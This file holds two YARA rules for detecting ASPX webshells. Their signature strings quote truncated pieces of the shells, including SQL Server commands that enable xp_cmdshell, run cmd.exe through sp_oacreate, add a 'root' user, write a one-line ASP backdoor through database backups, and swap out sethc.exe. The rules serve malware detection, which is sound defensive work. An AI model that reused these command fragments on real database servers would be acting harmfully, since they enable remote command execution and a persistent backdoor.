rule _543b1760d424aa694de61e6eb6b3b959dee746c2_a91320483df0178eb3cafea830c1bd94585fc896_b33086d2702fe6266783cd92638408d012966f31__27
{
    meta:
        description = "aspx - from files 543b1760d424aa694de61e6eb6b3b959dee746c2.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e177b10b6508f4f80cdfc5db5efee2594f29661889869b7759fd7de6b3b809ac"
        hash2 = "b96628b36911fce4ffa18cc10ba36d1dbd260f638c18b60e73f484c09ef0be09"
        hash3 = "a7da83250466100782ccb95ef8e2b4c5832df8811e99b8e332594a869391dfa6"
        hash4 = "d8f79f3f185fe10f8598b5d88fd55219d809856150fd693347b32d7df6ad6999"
    strings:
        $x1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"Bin_List_Exec\" AutoPostBack=\"True\" OnSelectedIndexChanged=\"Bin_List_Select" ascii
        $x2 = "ePath.Value + \"\\\" -T -f c:\\\\windows\\\\temp\\\\tmp.fmt'\");" fullword ascii
        $x3 = "t:16px\" size=\"40\" value=\"c:\\windows\\system32\\sethc.exe\"/>&nbsp;&nbsp;&nbsp;&nbsp;<asp:Button runat=\"server\" " fullword ascii
        $x4 = "Bin_ExecSql(\"exec master..xp_cmdshell'bcp \\\"select safile from \" + db + \"..bin_temp\\\" queryout \\\"\" + Bin_TextBox_Sav" fullword ascii
        $x5 = "if(Bin_ExecSql(\"exec master..xp_makecab '\" + tmppath + \"\\\\~098611.tmp','default',1,'\" + Bin_TextBox_Source.Value + \"" fullword ascii
        $s6 = "<td style=\"width:20%\" align=\"left\">Target : <input id=\"Bin_TextBox_Target\" class=\"input\" runat=\"server\" type=\"text\" " ascii
        $s7 = ".GetFileName(Bin_TextBox_Target.Value) + \"'\")){Bin_Msg(\"File Copyed,Good Luck!\");}" fullword ascii
        $s8 = "string res = Bin_DataTable(\"EXECUTE master..xp_fileexist '\" + Bin_TextBox_SavePath.Value + \"'\").Rows[0][0].ToString(" fullword ascii
        $s9 = "if(Bin_ExecSql(\"declare @a int;exec master..sp_oacreate'Scripting.FileSystemObject',@a output;exec master..sp_oameth" fullword ascii
        $s10 = "Bin_ExecSql(\"EXEC master..sp_configure 'show advanced options', 1;RECONFIGURE;EXEC master..sp_configure 'xp_cmds" fullword ascii
        $s11 = "<asp:DataGrid runat=\"server\" ID=\"Bin_DataGrid_Wmi\" HeaderStyle-CssClass=\"head\" BorderWidth=\"0\" " fullword ascii
        $s12 = "';exec master..xp_unpackcab '\" + tmppath + \"\\\\~098611.tmp','\" + Path.GetDirectoryName(Bin_TextBox_Target.Value) + \"',1,'\"" ascii
        $s13 = "<asp:Button runat=\"server\" ID=\"Bin_Button_Query\" CssClass=\"bt\" Text=\"Query\" onclick=\"Bin_Button_Query_Click\"/> " fullword ascii
        $s14 = "if(Bin_ExecSql(\"declare @a int;exec master..sp_oacreate'Scripting.FileSystemObject',@a output;exec master..sp_oamethod @a,'Copy" ascii
        $s15 = "od @a,'CopyFile',null,'\" + Bin_TextBox_Source.Value + \"','\" + Bin_TextBox_Target.Value+ \"'\")){     Bin_Msg(\"File Copyed,Go" ascii
        $s16 = "<asp:LinkButton ID=\"zcg_lbtnADSLDAPRootDSE\" runat=\"server\" Text=\"LDAPRootDSE\" CommandArgument=\"LDAP://RootDSE\" OnClick=" ascii
        $s17 = "onclick=\"Bin_Button_CabCopy_Click\"  />&nbsp;&nbsp;&nbsp;&nbsp;<asp:Button runat=\"server\" " fullword ascii
        $s18 = "Bin_H2_Title.InnerText = \"Plugin Loader >>\";       " fullword ascii
        $s19 = "string strfrm=\"8.0|1|1       SQLIMAGE      0       0       \\\"\\\"                        1     safile     \\\"\\\"\";" fullword ascii
        $s20 = "ID=\"Bin_Button_SaUpfile\" runat=\"server\" CssClass=\"bt\" " fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _0378b9a95ed3af4943c6a58d87345dc944b881f7_0f8a4b1a9436476f570d004240efb2c9bbc19aa6_2607882493f7c22ca0a0a5076d953a6f892ad11b__28
{
    meta:
        description = "aspx - from files 0378b9a95ed3af4943c6a58d87345dc944b881f7.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a4ea5fc7d14f27bbf0697782e4a948cd50442164b1d84e7b23e6463da853a653"
        hash2 = "89cbea413c850aab5d67c4fa4798cdb9b62f56083e2f9362292a5e48423fee85"
        hash3 = "9e9bcb9e2592626d80592d5308ce34cf06fb4a110d02bba16810580ba1c0c3dc"
        hash4 = "8d471c18d5306c15331e366d9595b6258fb51ea28ba13c288edb06c6a9c5a7f1"
        hash5 = "5c87ec9fbe71e3bdac867de4462c41cd28f1e50b31b1cd7e4fc6371a12f90db4"
        hash6 = "6f05055413ed95f501da9b6282cfc012d6201853b620a59d250edeac66474c16"
        hash7 = "15eed42e4904205b2ef2ff285ff1ce6c8138296c12cf075a2562c69a5fafd1cb"
        hash8 = "c3a539c800defe4c8e7147a3d36f436cd3c49c455c45de0431cc9ab65a2fe493"
        hash9 = "9c9e6feece7f19a1c7151a5778c3b20df83170a63402199b15eddd8a57c85297"
        hash10 = "0b98620cb8ac21af5712f4e88ed6f42791eb35f48d2ed56b86b32ced845c68d1"
        hash11 = "1286a0815c6982fadf3a1da2565fedfd133b8d07a5de1d592a640c3abbc2ffa5"
        hash12 = "a350ca8e276a0d6f788ecea1b826e089a63df84b53ba92c9f13e701c70d6781e"
        hash13 = "2152f5aae39aebabd342ec252b2ec0fec2913b605b21c3983c016a3b83949b7f"
        hash14 = "c5d0c5851f404a27a261f098d69a86807b93e255879d736ba0fb2c96250661e6"
        hash15 = "46942a63d4d7113cca44fd86155915de0edaa1732177f878987e5893801e2daf"
        hash16 = "ebb106f401b34fe0656403d3d8c6cd836d1ac9680c60fdd8b60380c6a3bc0602"
        hash17 = "6e5b606bb919b0c9cdf98383aaa5e4d606db87e254251dc3ca7498b918900969"
    strings:
        $x1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" OnSelectedIndexChanged=\"zOVO\" CssClass=\"list\"" ascii
        $x2 = ":ListItem><asp:ListItem Value=\"Declare @s int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /" ascii
        $s3 = "Item Value=\"\">-- SQL Server Exec --</asp:ListItem><asp:ListItem Value=\"Use master dbcc addextendedproc('xp_cmdshell','xplog70" ascii
        $s4 = "WORD',1;select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\windows\\system32\\ias\\ias.mdb','select shell(&#34;cm" ascii
        $s5 = "lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='c:\\bin.asp' backup database @b" ascii
        $s6 = "utfile='c:\\bin.asp',@charset=gb2312,@query='select ''&lt;%execute(request(chr(35)))%&gt;'''\">SP_makewebtask make file</asp:Lis" ascii
        $s7 = "echo ^&lt;%execute(request(char(35)))%^>>c:\\bin.asp';\">SP_oamethod exec</asp:ListItem><asp:ListItem Value=\"sp_makewebtask @ou" ascii
        $s8 = "e /c net user root root/add &#34;)')\">SandBox</asp:ListItem><asp:ListItem Value=\"create table [bin_cmd]([cmd] [image]);declare" ascii
        $s9 = "l')\">Add xp_cmdshell</asp:ListItem><asp:ListItem Value=\"Use master dbcc addextendedproc('sp_OACreate','odsole70.dll')\">Add sp" ascii
        $s10 = "a sysname,@s nvarchar(4000)select @a=db_name(),@s=0x62696E backup log @a to disk=@s;insert into [bin_cmd](cmd)values('&lt;%execu" ascii
        $s11 = "to disk=@t WITH DIFFERENTIAL,FORMAT;drop table [bin_cmd];\">DatabaseBackup</asp:ListItem></asp:DropDownList>" fullword ascii
        $s12 = "create</asp:ListItem><asp:ListItem Value=\"Exec sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshel" ascii
        $s13 = "',1;RECONFIGURE;\">Add xp_cmdshell(SQL2005)</asp:ListItem><asp:ListItem Value=\"Exec sp_configure 'show advanced options',1;RECO" ascii
        $s14 = "o.xp_cmdshell 'net user'\">XP_cmdshell exec</asp:ListItem><asp:ListItem Value=\"EXEC MASTER..XP_dirtree 'c:\\',1,1\">XP_dirtree<" ascii
        $s15 = "Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Web Assistant Procedures',1;RECONFIGURE;\">Add makewe" ascii
        $s16 = "task(SQL2005)</asp:ListItem><asp:ListItem Value=\"Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Ad " ascii
        $s17 = "oc Distributed Queries',1;RECONFIGURE;\">Add openrowset/opendatasource(SQL2005)</asp:ListItem><asp:ListItem Value=\"Exec master." ascii
        $s18 = "te(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='e:\\1.asp' backup log @b to disk=@t with" ascii
        $s19 = "IGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;\">Add sp_oacreate(SQL2005)</asp:ListItem><asp:ListItem Value=" ascii
        $s20 = "init,no_truncate;drop table [bin_cmd];\">LogBackup</asp:ListItem><asp:ListItem Value=\"create table [bin_cmd]([cmd] [image]);dec" ascii
    condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef or uint16(0) == 0x3c76 ) and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}
